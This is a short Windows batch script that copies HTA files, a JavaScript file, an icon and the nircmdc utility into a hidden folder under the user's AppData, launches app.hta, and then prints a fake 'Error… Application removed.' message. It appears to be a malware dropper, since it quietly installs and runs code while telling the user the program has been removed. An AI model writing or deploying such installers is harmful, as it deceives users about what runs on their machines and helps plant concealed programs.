@echo off
md %appdata%\Oneforall\
copy app.hta %appdata%\Oneforall\
copy ico.ico %appdata%\Oneforall\
copy int.hta %appdata%\Oneforall\
copy nircmdc.exe %appdata%\Oneforall\
copy gaia.js %appdata%\Oneforall\
cd %appdata%\Oneforall\
start app.hta
echo ----------------------
echo Error line 32 char 3
echo Application removed.
echo ----------------------
pause
